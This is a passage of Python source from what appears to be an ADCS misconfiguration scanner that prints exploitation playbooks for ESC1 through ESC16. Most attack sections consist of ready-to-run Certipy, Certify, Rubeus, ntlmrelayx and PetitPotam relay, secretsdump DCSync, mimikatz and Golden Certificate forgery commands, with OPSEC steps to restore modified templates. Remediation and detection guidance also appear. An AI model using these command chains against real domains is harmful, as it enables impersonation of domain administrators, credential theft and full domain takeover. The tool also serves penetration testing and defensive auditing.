        out.append("  Get enrollment agent cert, request any client-auth cert on behalf of DA.")
        out.append("")
        cmd("Linux - Certipy (two-step)",
            "# Step 1: obtain enrollment agent certificate",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -template '{template_name}'",
            "",
            "# Step 2: request client-auth cert for target",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template 'User' -on-behalf-of '{domain}\\<TARGET>' -pfx user.pfx",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC4":
        hdr("Vulnerable Template ACL (modify -> ESC1 -> exploit -> restore)")
        out.append(f"  Template : {template_name}")
        out.append("  Low-priv has WriteDacl/WriteOwner/GenericAll -> modify template -> ESC1.")
        out.append("")
        cmd("Linux - Certipy",
            "# Step 1: backup config and enable EnrolleeSuppliesSubject",
            f"certipy template -u '<USER>@{domain}' -p '<PASS>' -template '{template_name}' -save-old",
            "",
            "# Step 2: request cert with target UPN (ESC1 now active on template)",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template '{template_name}' -upn '<TARGET>@{domain}'",
            "",
            "# Step 3: restore template (OPSEC)",
            f"certipy template -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -template '{template_name}' -configuration {template_name}.json",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")
        cmd("Windows - Certify",
            f"Certify.exe request /ca:'{ca_host}\\{ca_name}' /template:'{template_name}' /altname:'<TARGET>'")

    elif esc_id == "ESC6":
        hdr("EDITF_ATTRIBUTESUBJECTALTNAME2 (every enrollable template becomes ESC1)")
        out.append("  CA-level flag allows specifying SAN in any certificate request.")
        out.append("")
        cmd("Linux - Certipy (any low-priv-enrollable template)",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template 'User' -upn '<TARGET>@{domain}' -dc-ip '<DC-IP>'",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")
        cmd("Windows - Certify + Rubeus",
            f"Certify.exe request /ca:'{ca_host}\\{ca_name}' /template:'User' /altname:'<TARGET>'",
            f"Rubeus.exe asktgt /user:<TARGET> /certificate:cert.pfx /password:'' /domain:{domain} /ptt")

    elif esc_id == "ESC7":
        hdr("Vulnerable CA ACL (ManageCA / ManageCertificates)")
        out.append("  ManageCA: add yourself as officer, enable ESC6, or approve pending requests.")
        out.append("  ManageCertificates: approve pending requests directly.")
        out.append("")
        cmd("Linux - Certipy (ManageCA path via SubCA template)",
            "# Add attacker as Certificate Officer",
            f"certipy ca -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -add-officer '<USER>'",
            "",
            "# Enable SubCA template",
            f"certipy ca -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -enable-template 'SubCA'",
            "",
            "# Request cert (will be Pending due to SubCA requiring approval)",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template 'SubCA' -upn '<TARGET>@{domain}'",
            "",
            "# Issue the pending request (use ID from previous output)",
            f"certipy ca -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -issue-request <REQUEST-ID>",
            "",
            "# Retrieve issued certificate",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -retrieve <REQUEST-ID>",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")
        cmd("Linux - Certipy (ManageCertificates: approve existing pending request)",
            f"certipy ca -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -issue-request <REQUEST-ID>",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -retrieve <REQUEST-ID>")

    elif esc_id == "ESC8":
        hdr("NTLM Relay to Web Enrollment (certsrv)")
        out.append(f"  Target: http://{ca_host}/certsrv/certfnsh.asp")
        out.append("  Relay a DC's NTLM authentication to obtain a domain controller certificate.")
        out.append("")
        cmd("Linux - ntlmrelayx + PetitPotam",
            "# Terminal 1: start NTLM relay",
            f"ntlmrelayx.py -t 'http://{ca_host}/certsrv/certfnsh.asp' \\",
            "  -smb2support --adcs --template 'DomainController'",
            "",
            "# Terminal 2: coerce DC authentication",
            "PetitPotam.py <ATTACKER-IP> <DC-IP>",
            f"# or: printerbug.py '{domain}/<USER>:<PASS>@<DC-IP>' <ATTACKER-IP>",
            "",
            "certipy auth -pfx '<DC>$.pfx' -dc-ip '<DC-IP>'",
            "",
            "# DCSync with the obtained DC hash:",
            f"secretsdump.py '{domain}/<DC>$@<DC-IP>' -hashes ':<NTLM-HASH>' -just-dc-user Administrator")

    elif esc_id == "ESC9":
        hdr("No Security Extension - Template Level (UPN swap)")
        out.append(f"  Template : {template_name}")
        out.append("  Requires GenericWrite on target account + StrongCertificateBindingEnforcement < 2.")
        out.append("")
        cmd("Linux - Certipy",
            "# Step 1: change victim UPN to impersonation target",
            f"certipy account update -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -user 'victim_account' -upn '<TARGET>@{domain}'",
            "",
            "# Step 2: request cert as victim (has target UPN, no SID extension)",
            f"certipy req -u 'victim_account@{domain}' -p '<VICTIM-PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' -template '{template_name}'",
            "",
            "# Step 3: restore victim UPN (OPSEC)",
            f"certipy account update -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -user 'victim_account' -upn 'victim_account@{domain}'",
            "",
            "# Step 4: authenticate",
            f"certipy auth -pfx '<TARGET>.pfx' -domain '{domain}' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC11":
        hdr("CA RPC Without Encryption (NTLM relay to MS-ICPR)")
        out.append("  CA does not enforce packet encryption on the RPC enrollment interface.")
        out.append("")
        cmd("Linux - ntlmrelayx + PetitPotam",
            "# Terminal 1: relay to CA RPC (MS-ICPR interface)",
            f"ntlmrelayx.py -t 'rpc://{ca_host}' -rpc-mode ICPR \\",
            "  --adcs --template 'DomainController' --no-http-server",
            "",
            "# Terminal 2: coerce DC authentication",
            "PetitPotam.py <ATTACKER-IP> <DC-IP>",
            "",
            "certipy auth -pfx '<DC>$.pfx' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC13":
        hdr("OID Group Link (issuance policy -> AD group membership)")
        out.append(f"  Template : {template_name}")
        out.append("  Enrolling grants effective membership in the OID-linked AD group.")
        out.append("  Verify: CN=OID,CN=Public Key Services,CN=Services,CN=Configuration")
        out.append("")
        cmd("Linux - Certipy",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' -template '{template_name}'",
            "",
            "# Certificate grants group membership upon Kerberos authentication",
            "certipy auth -pfx 'user.pfx' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC15":
        hdr("Schema v1 Arbitrary EKU in CSR (CVE-2024-49019 / EKUwu)")
        out.append(f"  Template : {template_name}")
        out.append("  Schema v1 does not override EKU from the CSR.")
        out.append("  Attacker specifies Client Authentication even if template lacks it.")
        out.append("")
        cmd("Linux - Certipy (inject Client Authentication EKU)",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template '{template_name}' -application-policies 'Client Authentication'",
            "",
            "certipy auth -pfx '<USER>.pfx' -dc-ip '<DC-IP>'")
        cmd("Linux - Certipy (ESC15 + EnrolleeSuppliesSubject -> impersonate any user)",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template '{template_name}' \\",
            "  -application-policies 'Client Authentication' \\",
            f"  -upn '<TARGET>@{domain}'",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC16":
        hdr("CA-Level SID Extension Disabled (CA-wide ESC9)")
        out.append("  Every certificate from this CA lacks the SID binding extension.")
        out.append("  Same UPN swap as ESC9 but any enrollable template works.")
        out.append("")
        cmd("Linux - Certipy",
            f"certipy account update -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -user 'victim_account' -upn '<TARGET>@{domain}'",
            "",
            f"certipy req -u 'victim_account@{domain}' -p '<VICTIM-PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' -template 'User'",
            "",
            f"certipy account update -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -user 'victim_account' -upn 'victim_account@{domain}'",
            "",
            f"certipy auth -pfx '<TARGET>.pfx' -domain '{domain}' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC5":
        hdr("Vulnerable PKI Object ACL")
        out.append("  ESC5 requires data outside standard cert template dumps.")
        out.append("  Vulnerable objects include:")
        out.append("    - CA server computer object ACL")
        out.append("    - CN=Public Key Services,CN=Services,CN=Configuration (and sub-containers)")
        out.append("    - CN=Enrollment Services, CN=NTAuthCertificates, CN=AIA, CN=CDP")
        out.append("  Low-priv principal with GenericAll / WriteDacl / WriteOwner on any of these")
        out.append("  can compromise the entire PKI trust chain.")
        out.append("")
        cmd("Detection — Certipy",
            f"certipy find -u '<USER>@{domain}' -p '<PASS>' -dc-ip '<DC-IP>' -vulnerable",
            "# Review any ESC5 entries in the output")
        cmd("Detection — BloodHound CE (Cypher)",
            "MATCH p=(n)-[:GenericAll|WriteDacl|WriteOwner]->(m)",
            "WHERE m.name CONTAINS 'Public Key Services' OR m.objecttype = 'pkicontainer'",
            "RETURN p")
        cmd("Exploitation — grant yourself GenericAll on an enrollment service object",
            f"dacledit.py -action write -rights FullControl -principal '<USER>' \\",
            f"  -target-dn 'CN=Enrollment Services,CN=Public Key Services,...' \\",
            f"  -dc-ip '<DC-IP>' '{domain}/<USER>:<PASS>'",
            "",
            "# Then modify the CA object (e.g. add yourself as officer) to chain into ESC7")

    elif esc_id == "ESC12":
        hdr("TPM Attestation Bypass")
        out.append("  ESC12 requires CA server access for full assessment.")
        out.append("  Preconditions:")
        out.append("    - CA uses Microsoft Platform Crypto Provider")
        out.append("    - Template requires TPM key attestation")
        out.append("    - CA does not properly validate the attestation statement")
        out.append("  A successful bypass allows a software-key CSR to pass as TPM-attested.")
        out.append("")
        cmd("Detection — on the CA server",
            "# Check for Platform Crypto Provider templates:",
            "certutil -v -template | findstr /i 'Platform Crypto'",
            "",
            "# Check CA key attestation settings:",
            "certutil -v -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\CAPathLength",
            "",
            "# Via Certipy (with CA access):",
            f"certipy find -u '<USER>@{domain}' -p '<PASS>' -dc-ip '<DC-IP>' -vulnerable",
            "# Look for ESC12 in the findings")
        cmd("Exploitation — submit software-key CSR with forged attestation",
            "# Tooling varies by CA software version and attestation policy version.",
            "# Refer to current ESC12 PoC tooling in the SpecterOps / Certipy repositories.",
            "# Pre-req: enroll right on the attestation template + CA server reachable")

    else:
        out.append(f"[!] Unknown ESC identifier: {esc_id}")
        out.append(f"    Valid values: {', '.join(VALID_ATTACK_PATHS)} or ALL")

    out.append("")
    return out


def print_attack_table(vuln_records, ca_vuln_records, output_buffer):
    """Print compact vulnerability overview table (shown by default after every scan)."""
    if not vuln_records and not ca_vuln_records:
        return

    hdr = "=" * 70
    output_buffer.append("")
    output_buffer.append(hdr)
    output_buffer.append(f"{Colors.BOLD}ATTACK VECTORS OVERVIEW{Colors.RESET}")
    output_buffer.append(hdr)
    output_buffer.append("")

    COLS = [28, 7, 18, 20, 24]
    output_buffer.append(_table_divider(COLS))
    output_buffer.append(_table_row(
        ["Template", "Status", "ESC(s)", "CA", "Exploitable By"], COLS
    ))
    output_buffer.append(_table_divider(COLS, fill="="))

    for r in vuln_records:
        status = "ENABLED" if r.get("enabled") else "DISABLED"
        status_col = (
            f"{Colors.RED}{status}{Colors.RESET}" if status == "ENABLED"
            else f"{Colors.YELLOW}{status}{Colors.RESET}"
        )
        escs = ", ".join(sorted(r.get("escs", [])))
        output_buffer.append(_table_row(
            [r["name"], status_col, escs, r.get("ca_name", ""), r.get("exploitable_by", "")],
            COLS
        ))

    if ca_vuln_records:
        output_buffer.append(_table_divider(COLS))
        for r in ca_vuln_records:
            escs = ", ".join(sorted(r.get("escs", [])))
            output_buffer.append(_table_row(
                [f"[CA] {r['ca_name']}", "CA", escs, r["ca_name"], "see CA findings"], COLS
            ))

    output_buffer.append(_table_divider(COLS))
    output_buffer.append("")
    output_buffer.append(
        f"  Tip: {Colors.CYAN}--attack-path ESC1{Colors.RESET} shows exploitation "
        f"commands for a specific ESC (use ALL for every detected ESC)."
    )
    output_buffer.append(
        f"       {Colors.CYAN}--show-advanced{Colors.RESET} shows Golden Certificate "
        f"and other post-exploitation techniques."
    )
    output_buffer.append(
        f"       {Colors.CYAN}--remediation{Colors.RESET} shows consolidated fix guidance "
        f"for all detected vulnerabilities."
    )
    output_buffer.append(
        f"       {Colors.CYAN}--html report.html{Colors.RESET} generates a full HTML report "
        f"(overview, abuse techniques, ACL analysis)."
    )
    output_buffer.append("")


def print_attack_path(esc_ids, ca_name, ca_host, domain, vuln_records, output_buffer):
    """
    Print exploitation commands for one or more ESC IDs.
    Called when --attack-path is specified (with scan file or standalone).
    """
    hdr = "=" * 70
    output_buffer.append("")
    output_buffer.append(hdr)
    output_buffer.append(f"{Colors.BOLD}EXPLOITATION TECHNIQUES{Colors.RESET}")
    output_buffer.append(hdr)
    output_buffer.append("")
    output_buffer.append("Replace these placeholders in every command below:")
    output_buffer.append("  <USER>     - Attacker / low-priv account username")
    output_buffer.append("  <PASS>     - Account password")
    output_buffer.append(f"  <DOMAIN>   - FQDN domain         (detected: {domain})")
    output_buffer.append(f"  <CA>       - CA name             (detected: {ca_name})")
    output_buffer.append(f"  <CA-HOST>  - CA server hostname   (detected: {ca_host})")
    output_buffer.append("  <DC-IP>    - Domain controller IP")
    output_buffer.append("  <TARGET>   - Account to impersonate (e.g. administrator)")
    output_buffer.append("")

    def first_template_for(esc):
        for r in vuln_records:
            if esc in r.get("escs", []):
                return r["name"]
        return "<TEMPLATE>"

    for esc_id in esc_ids:
        tpl = first_template_for(esc_id)
        output_buffer.extend(_esc_commands(esc_id, ca_name, ca_host, domain, tpl))


def print_advanced_attacks(ca_name, ca_host, domain, output_buffer):
    """
    Print advanced post-exploitation techniques.
    Only shown when --show-advanced is passed.
    """
    hdr = "=" * 70
    output_buffer.append("")
    output_buffer.append(hdr)
    output_buffer.append(f"{Colors.MAGENTA}{Colors.BOLD}ADVANCED POST-EXPLOITATION{Colors.RESET}")
    output_buffer.append(hdr)
    output_buffer.append("")

    def sect(title, color=Colors.CYAN):
        output_buffer.append(f"{color}{Colors.BOLD}{title}{Colors.RESET}")
        output_buffer.append("-" * 70)

    def cmd(label, *lines):
        output_buffer.extend(_attack_cmd(label, *lines))

    sect("Pass-the-Certificate -> NTLM Hash -> DCSync")
    cmd("Linux - Certipy PKINIT + secretsdump",
        "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'",
        "# Outputs <TARGET>.ccache and NTLM hash",
        "",
        f"secretsdump.py '{domain}/<TARGET>@<DC-IP>' -hashes ':<NTLM-HASH>'",
        "",
        "# Or use the ccache directly:",
        "export KRB5CCNAME=<TARGET>.ccache",
        f"secretsdump.py -k -no-pass '{domain}/<TARGET>@<DC>' -just-dc-ntlm")
    cmd("Windows - Rubeus + Mimikatz",
        f"Rubeus.exe asktgt /user:<TARGET> /certificate:<TARGET>.pfx /password:'' /domain:{domain} /ptt",
        f"mimikatz# lsadump::dcsync /domain:{domain} /user:krbtgt")

    sect("Schannel LDAP Shell (no PKINIT required)")
    cmd("Linux - certipy auth -ldap-shell",
        "certipy auth -pfx '<TARGET>.pfx' -ldap-shell -dc-ip '<DC-IP>'",
        "",
        "# Or with PassTheCert:",
        "python3 passthecert.py -dc-ip '<DC-IP>' -pfx '<TARGET>.pfx' -action 'whoami'")

    sect("Shadow Credentials (WriteDacl / GenericAll on target user)")
    cmd("Linux - Certipy auto",
        f"certipy shadow auto -u '<USER>@{domain}' -p '<PASS>' -account '<TARGET>'",
        "# Automatically adds shadow cred, authenticates, and dumps NTLM hash")
    cmd("Windows - Whisker",
        "Whisker.exe add /target:<TARGET>",
        f"Rubeus.exe asktgt /user:<TARGET> /certificate:<base64> /password:'<PFX-PASS>' /domain:{domain} /ptt")

    sect(f"{Colors.RED}Golden Certificate (CA private key required){Colors.RESET}", color=Colors.RED)
    output_buffer.append("  Pre-req: local admin on CA server (ESC5/ESC7 chain or direct compromise).")
    output_buffer.append("  Offline forgery means you can authenticate as ANY user indefinitely.")
    output_buffer.append("")
    cmd("Linux - Certipy backup + forge",
        "# Export CA cert + private key (requires local admin on CA)",
        f"certipy ca -u '<CA-ADMIN>@{domain}' -p '<PASS>' -ca '{ca_name}' \\",
        f"  -target '{ca_host}' -backup",
        f"# Produces: {ca_name}.pfx",
        "",
        "# Forge cert for any user (completely offline, no CA contact needed)",
        f"certipy forge -ca-pfx '{ca_name}.pfx' \\",
        f"  -upn '<TARGET>@{domain}' -subject 'CN=<TARGET>'",
        "",
        "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")
    cmd("Windows - Mimikatz + ForgeCert (GhostPack)",
        "# On the CA server - export CA private key",
        "mimikatz# privilege::debug",
        "mimikatz# crypto::capi",
        "mimikatz# crypto::cng",
        "mimikatz# crypto::certificates /systemstore:local_machine /store:my /export",
        "",
        "# Forge cert offline (ForgeCert from GhostPack)",
        f"ForgeCert.exe --CaCertPath {ca_name}.pfx --CaCertPassword '' \\",
        f"  --Subject 'CN=<TARGET>' --SubjectAltName '<TARGET>@{domain}' \\",
        "  --NewCertPath forged.pfx --NewCertPassword ''",
        "",
        f"Rubeus.exe asktgt /user:<TARGET> /certificate:forged.pfx /password:'' /domain:{domain} /ptt",
        f"mimikatz# lsadump::dcsync /domain:{domain} /user:Administrator")

    output_buffer.append("=" * 70)
    output_buffer.append("")


# ---------------------------------------------------------------------------
# Output file handling
# ---------------------------------------------------------------------------

def write_output_file(filename, output_buffer):
    """Write output buffer to file without ANSI color codes"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for line in output_buffer:
                clean_line = Colors.strip_colors(line)
                f.write(clean_line + '\n')
    except Exception as e:
        print(f"[!] Warning: Could not write to output file: {e}")


def print_colored_output(output_buffer):
    """Print output buffer to console with ANSI colors"""
    for line in output_buffer:
        print(line)


# ---------------------------------------------------------------------------
# Remediation guidance
# ---------------------------------------------------------------------------

def print_remediation(vulnerabilities, output_buffer):
    """Print consolidated remediation recommendations for all detected ESCs."""
    unique_vulns = list(dict.fromkeys(vulnerabilities))
    if not unique_vulns:
        output_buffer.append(f"{Colors.GREEN}No vulnerabilities detected — no remediation required.{Colors.RESET}")
        output_buffer.append("")
        return

    output_buffer.append("REMEDIATION RECOMMENDATIONS")
    output_buffer.append("=" * 70)
    output_buffer.append("")

    remediations = {
        "ESC1": [
            "Disable 'Enrollee Supplies Subject' (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) on the template",
            "Enable Manager Approval for all enrollment requests",
            "Restrict enrollment rights to specific security groups (not Domain Users/Computers)",
        ],
        "ESC2": [
            "Define specific EKUs — remove 'Any Purpose' OID (2.5.29.37.0)",
            "Enable Manager Approval",
            "Restrict enrollment permissions to specific named groups",
        ],
        "ESC3": [
            "Remove Certificate Request Agent EKU from the template if not required",
            "Configure enrollment agent restrictions on the CA",
            "Set Authorized Signatures Required > 0",
            "Enable Manager Approval",
        ],
        "ESC4": [
            "Remove WriteProperty / WriteDacl / WriteOwner / GenericAll from low-privilege groups",
            "Audit recent template modifications: Event ID 4899 on the CA",
            "Use Certipy or BloodHound CE to confirm the exact exploitable right",
        ],
        "ESC6": [
            "Run: certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2",
            "Or via PSPKI: Remove-PolicyModuleFlag -Flag EDITF_ATTRIBUTESUBJECTALTNAME2",
            "Restart the CertSvc service after applying the change",
        ],
        "ESC7": [
            "Remove ManageCA and ManageCertificates rights from low-privilege groups",
            "Restrict CA management to dedicated CA administrator accounts only",
            "Audit CA configuration changes: Event ID 4873",
        ],
        "ESC8": [
            "Enforce HTTPS on certsrv/ (disable plain HTTP access)",
            "Enable Extended Protection for Authentication (EPA / Channel Binding)",
            "Disable web enrollment entirely if the interface is not required",
        ],
        "ESC9": [
            "Remove CT_FLAG_NO_SECURITY_EXTENSION from msPKI-Enrollment-Flag on the template",
            "Set StrongCertificateBindingEnforcement = 2 on all domain controllers",
            "Apply KB5014754 and all subsequent Certifried patches",
        ],
        "ESC10": [
            "Set HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\"
            "StrongCertificateBindingEnforcement = 2 on all DCs",
            "Apply KB5014754 and all subsequent patches",
            "Note: Full Enforcement became the default in February 2025 when the key is absent",
        ],
        "ESC11": [
            "Enable IF_ENFORCEENCRYPTICERTREQUEST on the CA:",
            "  certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST",
            "Restart CertSvc after applying the flag",
            "Block unauthenticated NTLM or enforce SMB/RPC signing across the network",
        ],
        "ESC13": [
            "Remove issuance policy OIDs from templates if OID-to-group links are not required",
            "Audit CN=OID,CN=Public Key Services for sensitive group-link configurations",
            "Restrict enrollment rights to non-privileged groups for all affected templates",
        ],
        "ESC15": [
            "Upgrade template schema version from 1 to 2 or higher",
            "Enable Manager Approval on all schema v1 templates as interim mitigation",
            "Apply November 2024 patches (CVE-2024-49019)",
            "Restrict enrollment to specific named security groups",
        ],
        "ESC16": [
            "Remove szOID_NTDS_CA_SECURITY_EXT from the CA DisableExtensionList",
            "Verify: certutil -v -getreg CA\\PolicyModules\\..\\DisableExtensionList",
            "Set StrongCertificateBindingEnforcement = 2 on all domain controllers",
        ],
    }

    for vuln in unique_vulns:
        if vuln in remediations:
            output_buffer.append(f"{Colors.YELLOW}{Colors.BOLD}{vuln} Remediation:{Colors.RESET}")
            for step in remediations[vuln]:
                output_buffer.append(f"  - {step}")
            output_buffer.append("")

    output_buffer.append(f"{Colors.CYAN}General Best Practices:{Colors.RESET}")
    output_buffer.append("  * Restrict enrollment rights to named security groups — never Domain Users/Computers")
    output_buffer.append("  * Audit certificate template and CA permissions regularly")
    output_buffer.append("  * Monitor Event IDs 4886, 4887, 4899 for suspicious certificate requests")
    output_buffer.append("  * Monitor Event ID 4873 for CA configuration changes")
    output_buffer.append("  * Run Certipy or BloodHound CE periodically to detect new misconfigurations")
    output_buffer.append("")


# ---------------------------------------------------------------------------
# HTML report generation
# ---------------------------------------------------------------------------

def generate_html_report(filename, vuln_records, ca_vuln_records, acl_data,
                         all_vulnerabilities, best_ca, best_host, best_domain,
                         format_type, input_file):
    """Generate a self-contained HTML report with structured cards and accordion abuse techniques."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    unique_vulns = set(all_vulnerabilities)

    critical_set = {"ESC1", "ESC2", "ESC3", "ESC4", "ESC6", "ESC7", "ESC15"}
    high_set = {"ESC9", "ESC10", "ESC11", "ESC16"}

    def esc_severity(esc):
        if esc in critical_set: return "CRITICAL"
        if esc in high_set: return "HIGH"
        return "MEDIUM"

    _rank = {"CRITICAL": 2, "HIGH": 1, "MEDIUM": 0}

    def worst_sev(escs):
        return max((esc_severity(e) for e in escs), key=lambda s: _rank.get(s, 0), default="")

    def h(text):
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    D = h(best_domain)
    CA = h(best_ca)
    HOST = h(best_host)

    def first_tpl(esc):
        for r in vuln_records:
            if esc in r.get("escs", []):
                return h(r["name"])
        return "&lt;TEMPLATE&gt;"

    def tpls_for(esc):
        return [h(r["name"]) for r in vuln_records if esc in r.get("escs", [])]

    # ------------------------------------------------------------------
    # ESC card builder
    # ------------------------------------------------------------------
    def esc_card(esc_id, title, severity, desc, prereqs, cmd_groups):
        detected = esc_id in unique_vulns
        sc = severity.lower()
        open_attr = " open" if detected else ""
        det_cls = " det" if detected else ""
        det_badge = '<span class="badge det-badge">&#10003; DETECTED</span>' if detected else ""
        tpl_names = tpls_for(esc_id)
        tpl_html = ""
        if tpl_names:
            items = "".join(f"<li>{t}</li>" for t in tpl_names)
            tpl_html = (
                f'<div class="info-box tpl-box">'
                f'<div class="box-lbl">&#9670; Affected Templates</div>'
                f'<ul>{items}</ul></div>'
            )
        pre_items = "".join(f"<li>{p}</li>" for p in prereqs)
        cmd_html = ""
        for label, code in cmd_groups:
            cmd_html += (
                f'<div class="cmd-card">'
                f'<div class="cmd-lbl"><span class="cmd-icon">&#x276F;</span> {label}</div>'
                f'<pre class="cmd-pre">{code}</pre>'
                f'<button class="copy-btn" onclick="cpCmd(this)">&#10697; Copy</button>'
                f'</div>'
            )
        return (
            f'<details class="esc-card{det_cls}"{open_attr}>'
            f'<summary class="esc-hdr">'
            f'<div class="esc-left">'
            f'<span class="esc-chip {sc}">{esc_id}</span>'
            f'<span class="esc-name">{title}</span>'
            f'</div>'
            f'<div class="esc-right">'
            f'<span class="badge {sc}">{severity}</span>'
            f'{det_badge}'
            f'<span class="chevron">&#9660;</span>'
            f'</div>'
            f'</summary>'
            f'<div class="esc-body">'
            f'<p class="esc-desc">{desc}</p>'
            f'<div class="info-box">'
            f'<div class="box-lbl">&#9670; Prerequisites</div>'
            f'<ul>{pre_items}</ul></div>'
            f'{tpl_html}'
            f'{cmd_html}'
            f'</div>'
            f'</details>'
        )

    # ------------------------------------------------------------------
    # All ESC definitions with commands
    # ------------------------------------------------------------------
    T1 = first_tpl("ESC1"); T2 = first_tpl("ESC2"); T3 = first_tpl("ESC3")
    T4 = first_tpl("ESC4"); T9 = first_tpl("ESC9"); T13 = first_tpl("ESC13")
    T15 = first_tpl("ESC15")

    esc_cards_html = "\n".join([
        esc_card("ESC1", "Subject Alternative Name Specification", "CRITICAL",
            "The template lets any enrollee specify an arbitrary UPN/SAN in the CSR. "
            "Combined with Client Authentication, a low-priv user can obtain a certificate "
            "impersonating any domain account — including Domain Admins — and authenticate via PKINIT.",
            ["Enrollee Supplies Subject = True", "Client Authentication EKU present",
             "Manager Approval not required", "Template is enabled",
             "Low-priv principal holds an enrollment right"],
            [("Linux &mdash; Certipy",
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template '{T1}' -upn '&lt;TARGET&gt;@{D}' -dc-ip '&lt;DC-IP&gt;'\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Windows &mdash; Certify + Rubeus",
              f"Certify.exe request /ca:'{HOST}\\{CA}' /template:'{T1}' /altname:'&lt;TARGET&gt;'\n\n"
              "# Convert PEM to PFX:\n"
              "openssl pkcs12 -in cert.pem -keyex \\\n"
              "  -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' \\\n"
              "  -export -out cert.pfx\n\n"
              f"Rubeus.exe asktgt /user:&lt;TARGET&gt; /certificate:cert.pfx \\\n"
              f"  /password:'' /domain:{D} /dc:&lt;DC-IP&gt; /ptt\n\n"
              f"mimikatz# lsadump::dcsync /domain:{D} /user:krbtgt")]),

        esc_card("ESC2", "Any Purpose EKU Abuse", "CRITICAL",
            "The template has the 'Any Purpose' EKU (or no EKU at all). "
            "Certificates issued from it can be used for any purpose — including as an enrollment agent "
            "to request certificates on behalf of other users.",
            ["Any Purpose OID (2.5.29.37.0) present, or EKU list empty",
             "Manager Approval not required", "Template is enabled",
             "Low-priv principal holds an enrollment right"],
            [("Linux &mdash; Certipy (two-step)",
              f"# Step 1: obtain Any-Purpose certificate\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -template '{T2}'\n\n"
              f"# Step 2: use it as enrollment agent to request a cert for a DA\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template 'User' -on-behalf-of '{D}\\&lt;TARGET&gt;' -pfx user.pfx\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'")]),

        esc_card("ESC3", "Certificate Request Agent EKU", "CRITICAL",
            "The template carries the Certificate Request Agent EKU "
            "(1.3.6.1.4.1.311.20.2.1). An attacker enrolls in this template to get an "
            "enrollment-agent certificate, then uses it to request any client-auth certificate "
            "on behalf of a privileged user.",
            ["Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1) present",
             "Manager Approval not required", "Template is enabled",
             "Low-priv principal holds an enrollment right",
             "A second template with Client Authentication EKU is accessible"],
            [("Linux &mdash; Certipy (two-step)",
              f"# Step 1: obtain enrollment-agent certificate\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -template '{T3}'\n\n"
              f"# Step 2: request client-auth certificate for target using agent cert\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template 'User' -on-behalf-of '{D}\\&lt;TARGET&gt;' -pfx user.pfx\n\n"
